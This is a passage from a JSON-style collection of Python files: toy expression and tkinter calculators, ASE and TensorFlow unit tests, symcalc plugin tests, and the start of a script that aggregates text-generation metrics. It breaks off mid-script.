\u5f53\u524d\u5b57\u7b26\u4e32\u6700\u5185\u90e8\u7684\u503c\n    \"\"\"\n    try:  # re\u7684search\u65b9\u6cd5\u5982\u679c\u5339\u914d\u4e0d\u5230\u5185\u5bb9\u5c31\u4f1a\u62a5\u9519\n        pattern = re.compile(r\"\\((?P[\\d\\+\\-\\*\\/.]*)\\)\")\n        init_str = pattern.search(calc_str).group(\"init\")\n        value = str(calculate(init_str))\n        result = re.sub(r\"\\([\\d\\+\\-\\*\\/.]*\\)\", value, calc_str, 1)  # \u53ea\u66ff\u6362\u7b2c\u4e00\u6b21\u5339\u914d\u5230\u7684\n        return result\n    except Exception:\n        return None\n\n\nwhile True:\n    origin_str = input(\"\u8bf7\u8f93\u5165\u8981\u8ba1\u7b97\u7684\u5185\u5bb9: \")\n    calc_str = del_space(origin_str)\n    if check_special(calc_str):\n        print(\"\u5b58\u5728\u7279\u6b8a\u5b57\u7b26, \u8bf7\u68c0\u67e5\u540e\u518d\u8ba1\u7b97!\")\n        continue\n    while True:\n        str_init = replace_expr(calc_str)\n        if str_init:\n            calc_str = str_init\n        else:\n            value = calculate(calc_str)\n            print(\"\u6700\u7ec8\u7684\u7ed3\u679c\u4e3a: \", value)\n            break\n\n# \u6d4b\u8bd5: calc_strx = \"3+ ((1* 5*3) + ( (3* (8/2)/2) +2 ) *2) *2 - 4\"\n# \u6b63\u786e\u7ed3\u679c\u4e3a:61", "294": "#!/usr/bin/env python3\n\nfrom tkinter import *\nimport math\nimport tkinter.messagebox\nfrom tkmacosx import Button\n\n\n\n# from cx_Freeze import setup, Executable\n# base = None\n# executables = [Executable(\"calculator.py\", base=base)]\n# packages = [\"idna\"]\n# options = {\n#     'build_exe': {    \n#         'packages':packages,\n#     },\n# }\n# setup(\n#     name = \"Anto's Calculator\",\n#     options = options,\n#     version = \"1.0\",\n#     description = 'My calculator',\n#     executables = executables\n# )\n\n\ncalc_input = \"\"\noperation = \"\"\n\ndef input_key(value):\n  global calc_input\n  global operation\n  calc_input += str(value)\n\n\n  #print(calc_input)\n  calc_input_text.set(calc_input)\n  if value == \"+\":\n    operation = \"+\"\n  if value == \"-\":\n    operation = \"-\"\n  if value == \"x\":\n    operation = \"x\"\n  if value == \"\u00f7\":\n    operation = \"\u00f7\"\n\ndef equal():\n  global calc_input\n  global operation\n  result = 0\n\n  if operation == \"+\":\n    additions = calc_input.split(\"+\")\n    print(\"addition\", additions)\n    for value in additions:       \n      result += float(value)\n  \n  if operation == \"-\":\n    soustractions = calc_input.split(\"-\")\n    for value in soustractions:\n      result = -result - float(value)\n\n  if operation == \"x\":\n    multiplication = calc_input.split(\"x\")\n    result = 1 \n    for value in multiplication:\n      print(value, result)\n      result = result * float(value)\n\n  if operation == \"\u00f7\":\n    division = calc_input.split(\"\u00f7\")\n    result = int(division[0])\n    for value in division[1:]: \n      #print(value, result)\n      result = result / float(value)\n      #print(value, result)\n\n  \n  calc_input = \"\"\n  calc_input_text.set(calc_input)\n  result_text.set(result)\n  #print(result)\n\ndef square():\n  global calc_input\n  result = int(calc_input) * int(calc_input)\n\n  calc_input = \"\"\n  calc_input_text.set(calc_input)\n  result_text.set(result)\n\ndef percent():\n  global calc_input\n  result = int(calc_input) / 100\n\n  calc_input = \"\"\n  calc_input_text.set(calc_input)\n  result_text.set(result)\n\ndef cos():\n  global calc_input\n  result = math.cos(float((calc_input)))\n  calc_input_text.set(calc_input)\n  result_text.set(result)\n  print(result)\n  \ndef tan():\n  global calc_input\n  result = math.tan(float((calc_input)))\n  calc_input_text.set(calc_input)\n  result_text.set(result)\n  print(result)\n  \ndef sin():\n  global calc_input\n  result = math.sin(float((calc_input)))\n  calc_input_text.set(calc_input)\n  result_text.set(result)\n  print(result)\n\ndef exp():\n  global calc_input\n  e = calc_input.split(\"e\")\n  result = float(e[0])\n  for value in e:\n    result = float(value) * math.e\n    calc_input_text.set(calc_input)\n    result_text.set(result)\n  print(result)\n\n\n\ndef clear():\n  global calc_input\n  global operation\n\n  calc_input = \"\"\n  operation = \"\"\n\n  calc_input_text.set(calc_input)\n  result_text.set(calc_input)\n  result_bin.set(calc_input)\n\ndef base():\n  global calc_input\n  value = var.get()\n\n  if value == 2:\n    bina = bin(int(calc_input))\n    result_bin.set(bina)\n    calc_input=\"\"\n    calc_input_text.set(calc_input)\n\n  if value == 10:\n    i=0\n    toDec = result_bin.get()\n    toDec2 = result_text.get()\n    length_str=len(toDec)\n    length_str2=len(toDec2)\n\n\n    sliced_toDec=toDec[length_str::-1]\n    sliced_toDec2=toDec2[length_str2::-1] \n \n    decimal = 0\n    if toDec:\n      #print(\"bin\")\n      for val in sliced_toDec:\n        if val ==\"b\":\n          break\n        decimal += ((int(val))*(2**i))\n        i+=1\n      result_text.set(decimal)\n    if toDec2:\n      print(\"hex\")\n      for val in sliced_toDec2:\n        if val ==\"x\":\n          break\n        decimal += (int(val)*(16**i))\n        i+=1\n      result_text.set(decimal)\n\n    else:\n      print(\"hexa\")\n\n  if value == 16:\n    hexa = hex(int(calc_input))\n    result_text.set(hexa)\n    calc_input=\"\"\n    calc_input_text.set(calc_input)\n\n\n\nwindow = Tk()\nwindow.configure(background=\"black\")\nwindow.title(\"Anto's Calculator\")\nwindow.geometry(\"490x280\")\nwindow.resizable(0, 0)\n\n\n\ndef Scientific():\n  window.geometry(\"490x280+0+0\")\n \n \ndef Standard():\n  window.geometry(\"390x280+0+0\")\n\ndef Quit():\n  # window.quit()\n  Quit = tkinter.messagebox.askyesno(\"Anto's Calculator\", \"Do you want to exit ?\")\n\n  if Quit > 0:\n    window.destroy()\n    return\n\nmenubar = Menu(window)\n\n\nfilemenu = Menu(menubar, tearoff = 0)\nmenubar.add_cascade(label = 'File', menu = filemenu)\nfilemenu.add_command(label = \"Standard\", command = Standard)\nfilemenu.add_command(label = \"Scientific\", command = Scientific)\nfilemenu.add_separator()\nfilemenu.add_command(label = \"Exit\", command = Quit)\n\n\nwindow.config(menu=menubar)\n\nvar = IntVar()\nR1 = Radiobutton(window, text=\"2\", variable=var, value=2, command=base)\nR1.grid(row=0, column=4)\nR2 = Radiobutton(window, text=\"10\", variable=var, value=10, command=base)\nR2.grid(row=1, column=4)\nR3 = Radiobutton(window, text=\"16\", variable=var, value=16, command=base)\nR3.grid(row=2, column=4)\n\n\n# value = DoubleVar()\n# scale = Scale(window, variable=value, length=50, orient=HORIZONTAL, from_=8, to=16)\n# scale.grid(row=2, column=4)\n# scale.set(10)\n\n#Button(window, text=\"Fermer\", command=window.quit).grid(row=0, column=3)\n\nButton(window, text=\" AC \", bg=\"orange\", command=lambda: clear()).grid(row=3, column=0)\nButton(window, text=\" \u00b2 \", command=lambda: square()).grid(row=3, column=1)\nButton(window, text=\" % \", command=lambda: percent()).grid(row=3, column=2)\nButton(window, text=\" e \", command=lambda: exp()).grid(row=3, column=4)\nButton(window, text=\" tan \", command=lambda: tan()).grid(row=4, column=4)\nButton(window, text=\" cos \", command=lambda: cos()).grid(row=5, column=4)\nButton(window, text=\" sin \", command=lambda: sin()).grid(row=6, column=4)\n\nButton(window, text=\" . \", command=lambda: input_key(\".\")).grid(row=7, column=2)\nButton(window, text=\" 0 \", width=190, command=lambda: input_key(\"0\")).grid(row=7, column=0, columnspan = 2)\nButton(window, text=\" 1 \", command=lambda: input_key(\"1\")).grid(row=6, column=0)\nButton(window, text=\" 2 \", command=lambda: input_key(\"2\")).grid(row=6, column=1)\nButton(window, text=\" 3 \", command=lambda: input_key(\"3\")).grid(row=6, column=2)\nButton(window, text=\" 4 \", command=lambda: input_key(\"4\")).grid(row=5, column=0)\nButton(window, text=\" 5 \", command=lambda: input_key(\"5\")).grid(row=5, column=1)\nButton(window, text=\" 6 \", command=lambda: input_key(\"6\")).grid(row=5, column=2)\nButton(window, text=\" 7 \", command=lambda: input_key(\"7\")).grid(row=4, column=0)\nButton(window, text=\" 8 \", command=lambda: input_key(\"8\")).grid(row=4, column=1)\nButton(window, text=\" 9 \", command=lambda: input_key(\"9\")).grid(row=4, column=2)\n\nButton(window, text=\" \u00f7 \", bg=\"orange\", command=lambda: input_key(\"\u00f7\")).grid(row=3, column=3)\nButton(window, text=\" x \", bg=\"orange\", command=lambda: input_key(\"x\")).grid(row=4, column=3)\nButton(window, text=\" + \", bg=\"orange\", command=lambda: input_key(\"+\")).grid(row=5, column=3)\nButton(window, text=\" - \", bg=\"orange\", command=lambda: input_key(\"-\")).grid(row=6, column=3)\nButton(window, text=\" = \", bg=\"orange\", command=lambda: equal()).grid(row=7, column=3)\n\ncalc_input_text = StringVar()\ncalc_input_text.set(\"0.\")\nLabel(window, width=35, height=2, font=('arial', 18, 'bold'), bg=\"black\", textvariable=calc_input_text).grid(row=0, column=0, columnspan = 4)\nresult_text = StringVar()\nLabel(window, width=35, height=2, font=('arial', 18, 'bold'), bg=\"black\", textvariable=result_text).grid(row=1, column=0, columnspan = 4)\nresult_bin = StringVar()\nLabel(window, width=35, height=2, font=('arial', 18, 'bold'), bg=\"black\", textvariable=result_bin).grid(row=2, column=0, columnspan = 4)\n\nwindow.mainloop()", "295": "from numpy.testing import assert_allclose\nimport pytest\nfrom ase.build import molecule\n\n\n@pytest.mark.filterwarnings('once::DeprecationWarning')\n@pytest.mark.calculator_lite\n@pytest.mark.calculator('psi4')\ndef test_main(factory):\n    atoms = molecule('H2O')\n    atoms.rotate(30, 'x')\n\n    calc = factory.calc(basis='3-21G')\n    atoms.calc = calc\n\n    # Calculate forces ahead of time, compare against finite difference after\n    # checking the psi4-calc.dat file\n    atoms.get_forces()\n    assert_allclose(atoms.get_potential_energy(), -2056.785854116688,\n                    rtol=1e-4, atol=1e-4)\n\n    # Test the reader\n    calc2 = factory.calc()\n    calc2.read('psi4-calc')\n    assert_allclose(calc2.results['energy'], atoms.get_potential_energy(),\n                    rtol=1e-4, atol=1e-4)\n    assert_allclose(calc2.results['forces'], atoms.get_forces(),\n                    rtol=1e-4, atol=1e-4)\n\n    # Compare analytical vs numerical forces\n    assert_allclose(atoms.get_forces(), calc.calculate_numerical_forces(atoms),\n                    rtol=1e-4, atol=1e-4)\n", "296": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "297": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "298": "from symcalc.plugins.notation.constants import NotationConstants\nfrom tests import TestCalculator, random_str, random_int\n\n\ndef test_plugin_constants_instantiate():\n    NotationConstants()\n\n\ndef test_plugin_constants_hook():\n    calc = TestCalculator()\n    plugin = NotationConstants()\n    calc.register_plugin(plugin)\n    assert plugin in calc.plugins\n\n\ndef test_plugin_constants_context_updated():\n    calc = TestCalculator()\n    calc.register_plugin(NotationConstants())\n    assert calc.chksym(\"constants\")\n    assert isinstance(calc.getsym(\"constants\"), dict)\n\n\ndef test_plugin_constants_available():\n    calc = TestCalculator()\n    calc.register_plugin(NotationConstants())\n    assert isinstance(calc.command(\"constants\"), dict)\n\n\ndef test_plugin_constants_use_default():\n    calc = TestCalculator()\n    plugin = NotationConstants()\n    calc.register_plugin_and_enable(plugin)\n    for k, v in plugin.table.items():\n        assert calc.command(f\"_{k}\") == v\n\n\ndef test_plugin_constants_use_custom():\n    calc = TestCalculator()\n    table = {}\n    for i in range(10):\n        table[random_str()] = random_str()\n    plugin = NotationConstants(table=table)\n    calc.register_plugin_and_enable(plugin)\n    for k, v in table.items():\n        assert calc.command(f\"_{k}\") == v\n\n\ndef test_plugin_constants_expressions():\n    calc = TestCalculator()\n    table = {}\n    for i in range(10):\n        table[random_str()] = random_int(-1000000000, 1000000000)\n    plugin = NotationConstants(table=table)\n    calc.register_plugin_and_enable(plugin)\n    for k1, v1 in table.items():\n        for k2, v2 in table.items():\n            assert calc.command(f\"_{k1} + _{k2}\") == v1 + v2\n            assert calc.command(f\"_{k1} * _{k2}\") == v1 * v2\n            assert calc.command(f\"abs(_{k1}) - abs(_{k2})\") == abs(v1) - abs(v2)\n\n\ndef test_plugin_constants_invalid(capfd):\n    calc = TestCalculator()\n    calc.register_plugin_and_enable(NotationConstants())\n    for t in range(20):\n        calc.command(\"_\" + random_str())\n        assert \"NameError\" in capfd.readouterr().out\n        calc.command(f\"{random_int(1,100)}_{random_int(1,100)}_{random_int(1,100)}\")\n        assert \"NameError\" not in capfd.readouterr().out\n\n\ndef test_plugin_constants_enable_switch(capfd):\n    calc = TestCalculator()\n    plugin = NotationConstants()\n    calc.register_plugin_and_enable(plugin)\n    for k, v in plugin.table.items():\n        assert calc.command(f\"_{k}\") == v\n    assert plugin.setting_name\n    calc.settings[plugin.setting_name] = False\n    for k in plugin.table.keys():\n        calc.command(f\"_{k}\")\n        assert \"NameError\" in capfd.readouterr().out\n", "299": "\"\"\"\n\nCheck the many ways of specifying KPOINTS\n\n\"\"\"\n\nimport os\nimport filecmp\n\nfrom ase.calculators.vasp import Vasp2 as Vasp\nfrom ase.build import bulk\nfrom ase.test.vasp import installed2 as installed\n\nassert installed()\n\n\nAl = bulk('Al', 'fcc', a=4.5, cubic=True)\n\n\ndef check_kpoints_line(n, contents):\n    \"\"\"Assert the contents of a line\"\"\"\n    with open('KPOINTS', 'r') as f:\n        lines = f.readlines()\n        assert lines[n] == contents\n\n# Default to (1 1 1)\n\ncalc = Vasp(gamma=True)\ncalc.write_kpoints()\ncheck_kpoints_line(2, 'Gamma\\n')\ncheck_kpoints_line(3, '1 1 1 \\n')\ncalc.clean()\n\n# 3-tuple prints mesh\ncalc = Vasp(gamma=False, kpts=(4, 4, 4))\ncalc.write_kpoints()\ncheck_kpoints_line(2, 'Monkhorst-Pack\\n')\ncheck_kpoints_line(3, '4 4 4 \\n')\ncalc.clean()\n\n# Auto mode\ncalc = Vasp(kpts=20)\ncalc.write_kpoints()\ncheck_kpoints_line(1, '0\\n')\ncheck_kpoints_line(2, 'Auto\\n')\ncheck_kpoints_line(3, '20 \\n')\ncalc.clean()\n\n# 1-element list ok, Gamma ok\ncalc = Vasp(kpts=[20], gamma=True)\ncalc.write_kpoints()\ncheck_kpoints_line(1, '0\\n')\ncheck_kpoints_line(2, 'Auto\\n')\ncheck_kpoints_line(3, '20 \\n')\ncalc.clean()\n\n# KSPACING suppresses KPOINTS file\ncalc = Vasp(kspacing=0.23)\ncalc.initialize(Al)\ncalc.write_kpoints()\ncalc.write_incar(Al)\nassert not os.path.isfile('KPOINTS')\nwith open('INCAR', 'r') as f:\n    assert ' KSPACING = 0.230000\\n' in f.readlines()\ncalc.clean()\n\n# Negative KSPACING raises an error\ncalc = Vasp(kspacing=-0.5)\n\ntry:\n    calc.write_kpoints()\nexcept ValueError:\n    pass\nelse:\n    raise AssertionError(\"Negative KSPACING did not raise ValueError\")\ncalc.clean()\n\n# Explicit weighted points with nested lists, Cartesian if not specified\ncalc = Vasp(\n    kpts=[[0.1, 0.2, 0.3, 2], [0.0, 0.0, 0.0, 1], [0.0, 0.5, 0.5, 2]])\ncalc.write_kpoints()\n\nwith open('KPOINTS.ref', 'w') as f:\n    f.write(\"\"\"KPOINTS created by Atomic Simulation Environment\n3 \nCartesian\n0.100000 0.200000 0.300000 2.000000 \n0.000000 0.000000 0.000000 1.000000 \n0.000000 0.500000 0.500000 2.000000 \n\"\"\")\n\nassert filecmp.cmp('KPOINTS', 'KPOINTS.ref')\nos.remove('KPOINTS.ref')\n\n# Explicit points as list of tuples, automatic weighting = 1.\ncalc = Vasp(\n    kpts=[(0.1, 0.2, 0.3), (0.0, 0.0, 0.0), (0.0, 0.5, 0.5)], reciprocal=True)\ncalc.write_kpoints()\n\nwith open('KPOINTS.ref', 'w') as f:\n    f.write(\"\"\"KPOINTS created by Atomic Simulation Environment\n3 \nReciprocal\n0.100000 0.200000 0.300000 1.0 \n0.000000 0.000000 0.000000 1.0 \n0.000000 0.500000 0.500000 1.0 \n\"\"\")\n\nassert filecmp.cmp('KPOINTS', 'KPOINTS.ref')\nos.remove('KPOINTS.ref')\n", "300": "\"\"\"\n#############################################################################\na container with an extra row of buttons for common operations;\na more useful customization: adds buttons for more operations (sqrt,\n1/x, etc.) by embedding/composition, not subclassing; new buttons are\nadded after entire CalGui frame because of the packing order/options;\n#############################################################################\n\"\"\"\n\nfrom tkinter import *\nfrom calculator import CalcGui, getCalcArgs\nfrom PP4E.Gui.Tools.widgets import frame, button, label\n\nclass CalcGuiPlus(Toplevel):\n    def __init__(self, **args):\n        Toplevel.__init__(self)\n        label(self, TOP, 'PyCalc Plus - Container')\n        self.calc = CalcGui(self, **args)\n        frm = frame(self, BOTTOM)\n        extras = [('sqrt', 'sqrt(%s)'),\n                  ('x^2 ',  '(%s)**2'),\n                  ('x^3 ',  '(%s)**3'),\n                  ('1/x ',  '1.0/(%s)')]\n        for (lab, expr) in extras:\n            button(frm, LEFT, lab, (lambda expr=expr: self.onExtra(expr)))\n        button(frm, LEFT, ' pi ', self.onPi)\n\n    def onExtra(self, expr):\n        text = self.calc.text\n        eval = self.calc.eval\n        try:\n            text.set(eval.runstring(expr % text.get()))\n        except:\n            text.set('ERROR')\n\n    def onPi(self):\n        self.calc.text.set(self.calc.eval.runstring('pi'))\n\nif __name__ == '__main__':\n    root = Tk()\n    button(root, TOP, 'Quit', root.quit)\n    CalcGuiPlus(**getCalcArgs()).mainloop()       # -bg,-fg to calcgui\n", "301": "import unittest\n\nfrom Calculator import Calculator\n\n\nclass TestCalculator(unittest.TestCase):\n    def test1(self):\n        c = Calculator()\n\n        self.assertEqual(c.calc(\"1+2\"), 3)\n        self.assertEqual(c.calc(\"1-2\"), -1)\n        self.assertEqual(c.calc(\"3^2\"), 9)\n        self.assertEqual(c.calc(\"5*4\"), 20)\n        self.assertEqual(c.calc(\"10/2\"), 5)\n\n        self.assertEqual(c.calc(\"(1+2)\"), 3)\n        self.assertEqual(c.calc(\"(1-2)\"), -1)\n        self.assertEqual(c.calc(\"(3^2)\"), 9)\n        self.assertEqual(c.calc(\"(5*4)\"), 20)\n        self.assertEqual(c.calc(\"(10/2)\"), 5)\n\n        self.assertEqual(c.calc(\"10/2+3\"), 8)\n        self.assertEqual(c.calc(\"10/(2+3)\"), 2)\n        self.assertEqual(c.calc(\"7-(1+1)\"), 5)\n", "302": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "303": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "304": "from vars import *\nimport os\ndef filter_by_node():\n\n    PATH_F=os.path.join(PATH_D,\"targets_t5small_egv_beam.txt\")\n  \n    with open(PATH_F, \"r\") as f:\n        lines=f.readlines()\n  #  count_nodes(lines)\n    n_nodes=[]\n    for line in lines:\n        #square_occ=count_square(line)\n        line=line.replace(\"]]]]]]\",\"]\").replace(\"]]]]]\",\"]\").replace(\"]]]]\",\"]\").replace(\"]]]\",\"]\").replace(\"]]\",\"]\")\n        nodes=line.split(\"]\")\n        n_nodes.append(len(nodes) - 1) #cut \\n character\n    #print(len(lines[10].replace(\"[[\",\"[\").replace(\"]]]]]]\",\"]\").replace(\"]]]]]\",\"]\").replace(\"]]]]\",\"]\").replace(\"]]]\",\"]\").replace(\"]]\",\"]\").split(\"]\")) - 1)\n    PATH_O=os.path.join(PATH_D,\"ts_num_nodes_for_line.txt\")\n    with open(PATH_O,\"a\")as f:\n        for node in n_nodes:\n            f.write(str(node) + '\\n')\n        \n\n    # print(len(f_list))\ndef count_square(line):\n    from itertools import groupby\n    groups = groupby(line)\n    result = [(label, sum(1 for _ in group)) for label, group in groups]\n    for r in result:\n        if(r[0] == ']'):\n            if max < r[1]:\n                max=r[1]\n    return max\n\ndef score_f_nodes(num_nodes=[1,2,3,4,5,6,7],m_type=\"\"):\n    PATH_F=os.path.join(PATH_D,\"num_nodes_for_line.txt\")\n    #METEOR\n    aggregator=[]\n    with open(\"meteor/barte.txt\",\"r\") as f:\n        meteor=f.readlines()\n    with open(\"rouge/barte1.txt\",\"r\") as f:\n        rouge1=f.readlines()\n    with open(\"rouge/barte2.txt\",\"r\") as f:\n        rouge2=f.readlines()\n    with open(\"rouge/barteL.txt\",\"r\") as f:\n        rougeL=f.readlines()\n    with open(\"bleu/results_barte.txt\",\"r\") as f:\n        bleu=f.readlines()\n    # with open(\"rouge/results-L.txt\",\"r\") as f:\n    #     rougeL=f.readlines()\n    with open(\"bleurt/bb.txt\",\"r\") as f:\n        bleurt=f.readlines()\n    with open(\"BARTScore/bart.txt\",\"r\") as f:\n        bartscore=f.readlines()\n    # with open(\"nubia/scores.txt\",\"r\") as f:\n    #     nub=f.readlines()\n    with open(\"bert_score/barte.txt\",\"r\") as f:\n        bert_s=f.readlines()\n            \n    # with open(\"repts.txt\",\"r\") as f:\n    #     repts=f.readlines()\n    with open(PATH_F,\"r\") as f:\n        lines=f.readlines()\n    # with open(\"questeval/results.txt\",\"r\") as f:\n    #     qeval_l=f.readlines()\n    with open(\"questeval/bart.txt\",\"r\") as f:\n         qeval_l=f.readlines()\n    ind=0\n    if 